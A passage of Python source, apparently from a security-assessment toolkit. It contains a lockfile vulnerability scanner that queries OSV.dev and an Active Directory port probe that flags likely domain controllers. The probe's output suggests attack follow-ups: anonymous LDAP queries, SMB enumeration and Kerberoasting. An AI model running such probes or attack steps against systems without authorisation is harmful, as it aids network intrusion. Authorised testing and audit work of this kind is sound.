    name = os.path.basename(path).lower()
    pkgs = {}
    try:
        if name == "package-lock.json":
            data = json.load(open(path, encoding="utf-8"))
            deps = data.get("dependencies", {}) or {}

            def walk(d):
                for k, v in d.items():
                    ver = (v or {}).get("version")
                    if ver and k not in pkgs:
                        pkgs[k] = ver
                    walk((v or {}).get("dependencies", {}) or {})
            walk(deps)
            return pkgs, "npm"
        if name in ("yarn.lock", "pnpm-lock.yaml"):
            cur = None
            for line in open(path, encoding="utf-8", errors="replace"):
                line = line.strip()
                if line and not line.startswith("#"):
                    m = re.match(r'"?([@\w.-]+(?:/[\w.-]+)?)@', line)
                    if m:
                        cur = m.group(1)
                    elif cur and line.startswith("version "):
                        pkgs.setdefault(cur, line.split(None, 1)[1].strip('"'))
                        cur = None
            return pkgs, "npm"
        if name == "requirements.txt":
            for line in open(path, encoding="utf-8", errors="replace"):
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("-"):
                    continue
                m = re.match(r"([A-Za-z0-9_.\-\[\]]+)\s*(?:==|>=|<=|~=)?\s*([0-9][A-Za-z0-9.\-]*)", line)
                if m:
                    pkgs[m.group(1).split("[")[0]] = m.group(2)
            return pkgs, "PyPI"
        if name in ("Pipfile.lock", "poetry.lock"):
            data = json.load(open(path, encoding="utf-8"))
            for section in ("default", "develop"):
                for k, v in (data.get(section, {}) or {}).items():
                    pkgs[k] = v.get("version", "latest")
            return pkgs, "PyPI"
        if name == "go.mod":
            for line in open(path, encoding="utf-8", errors="replace"):
                line = line.strip()
                if line.startswith("//") or line.startswith("module") or line.startswith("go "):
                    continue
                m = re.match(r"([\w./\-]+)\s+v?([0-9][\w.\-]*)", line)
                if m:
                    pkgs[m.group(1)] = m.group(2)
            return pkgs, "Go"
        if name in ("package.json", "composer.json"):
            data = json.load(open(path, encoding="utf-8"))
            combined = {}
            for k, v in (data.get("dependencies", {}) or {}).items():
                combined[k] = v
            for k, v in (data.get("devDependencies", {}) or {}).items():
                combined.setdefault(k, v)
            eco = "Packagist" if name == "composer.json" else "npm"
            for k, v in combined.items():
                pkgs[k] = str(v).lstrip("^~>=<").split(",")[0]
            return pkgs, eco
    except Exception:
        pass
    return None, None


def _osv_query(name, version, ecosystem):
    try:
        r = requests.post("https://api.osv.dev/v1/query",
                          json={"package": {"name": name, "ecosystem": ecosystem},
                                "version": version},
                          timeout=30)
        if r.status_code != 200:
            return []
        out = []
        for vuln in r.json().get("vulns", []):
            sev = "n/a"
            for d in vuln.get("database_specific", {}).get("severity", []) or []:
                if isinstance(d, dict):
                    sev = d.get("score") or sev
            for s in vuln.get("severity", []) or []:
                if isinstance(s, dict):
                    sev = s.get("score") or sev
            out.append({"id": vuln.get("id", "?"),
                        "summary": (vuln.get("summary") or "")[:110],
                        "severity": sev})
        return out
    except Exception:
        return None  # network failure


def tool_lockfile_scan(path="", max_packages=200):
    """Supply-chain scan: parse a lockfile and query OSV.dev for known
    vulnerabilities in each pinned version.

    Supports: package-lock.json, yarn.lock, pnpm-lock.yaml,
    requirements.txt, Pipfile.lock, poetry.lock, go.mod, package.json,
    composer.json. Needs internet for the OSV query.
    """
    if not path or not os.path.isfile(path):
        return ("lockfile_scan: provide a valid path "
                "(package-lock.json, requirements.txt, go.mod, ...)")
    pkgs, ecosystem = _parse_lockfile(path)
    if not pkgs:
        return ("lockfile_scan: could not parse %s as a supported lockfile. "
                "Supported: package-lock.json, yarn.lock, pnpm-lock.yaml, "
                "requirements.txt, Pipfile.lock, poetry.lock, go.mod, "
                "package.json, composer.json" % path)
    total = len(pkgs)
    items = list(pkgs.items())[:int(max_packages or 200)]
    out = ["Supply-chain scan: %s (%s ecosystem, %d packages%s)"
           % (path, ecosystem, total,
              ", checking first %d" % len(items) if len(items) < total else ""), ""]
    hits = []
    errored = False
    for name, ver in items:
        if ver == "latest" or not ver:
            continue
        result = _osv_query(name, ver, ecosystem)
        if result is None:
            errored = True
            break
        for v in result:
            hits.append((name, ver, v))
    if errored:
        out.append("(OSV query failed - network blocked? Showing parsed inventory only.)")
    elif not hits:
        out.append("No known vulnerabilities for %d pinned packages (OSV.dev)."
                   % len(items))
    out.append("")
    if hits:
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MODERATE": 2, "LOW": 3}
        hits.sort(key=lambda h: sev_order.get(h[2]["severity"], 9))
        out.append("Findings (%d):" % len(hits))
        for name, ver, v in hits:
            out.append("  [%s] %s %s - %s (%s)"
                       % (v["severity"], name, ver, v["id"], v["summary"]))
        out.append("")
        out.append("VERDICT: %d vulnerable pinned deps - upgrade or pin patched "
                   "versions; log add_finding (CWE-937/CWE-1104)."
                   % len(hits))
    else:
        out.append("VERDICT: inventory scanned (%d pkgs), no known CVEs via OSV. "
                   "Cross-check with 'dependency-cve-scanning' / Snyk for depth."
                   % total)
    return "\n".join(out)


# ---------------------------------------------------------------------------
# 12. Active Directory service probe
# ---------------------------------------------------------------------------

AD_PORTS = {
    53: "DNS", 88: "Kerberos (KDC)", 135: "RPC", 139: "NetBIOS-SSN",
    389: "LDAP", 445: "SMB", 464: "Kerberos kpasswd", 593: "RPC over HTTP",
    636: "LDAPS", 3268: "Global Catalog", 3269: "GC over SSL",
    3389: "RDP", 9389: "AD Web Services",
}


def _tcp_open(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def tool_ad_svc_probe(host="", ports="", timeout=3):
    """Active Directory presence probe: TCP-connect to the standard AD
    service ports (Kerberos/LDAP/SMB/GC/RDP/...). An open 88+389+445
    combination strongly suggests a domain controller."""
    if not host:
        return "ad_svc_probe: host (IP or hostname) is required"
    port_list = [int(p) for p in (ports or "53,88,135,139,389,445,464,593,"
                                  "636,3268,3269,3389,9389").split(",") if p.strip().isdigit()]
    out = ["AD service probe: %s" % host, ""]
    open_ports = []

    def check(p):
        return p, _tcp_open(host, p, int(timeout or 3))

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for p, ok in ex.map(check, port_list):
            label = AD_PORTS.get(p, "?")
            if ok:
                open_ports.append(p)
                out.append("  %-6d OPEN    %s" % (p, label))
            else:
                out.append("  %-6d closed  %s" % (p, label))
    out.append("")
    ad_score = 0
    for p in open_ports:
        if p in (88, 389, 445, 464, 3268, 3269, 636):
            ad_score += 1
    if ad_score >= 3 and 389 in open_ports and 445 in open_ports:
        out.append("VERDICT: VERY LIKELY A DOMAIN CONTROLLER (%d/7 AD services open). "
                   "Next: anonymous LDAP query (nmap ldap* scripts), SMB enumeration, "
                   "Kerberoast/ASREProast if creds, DC-locator DNS SRV check."
                   % ad_score)
    elif ad_score >= 1:
        out.append("VERDICT: AD SERVICES PARTIALLY EXPOSED (%d open). A member server "
                   "or filtered DC. Check SMB signing, LDAP anonymous bind, and "
                   "service banners next." % ad_score)
    else:
        out.append("VERDICT: No classic AD service ports open on this host "
                   "(or filtered). Not a domain controller.")
    return "\n".join(out)
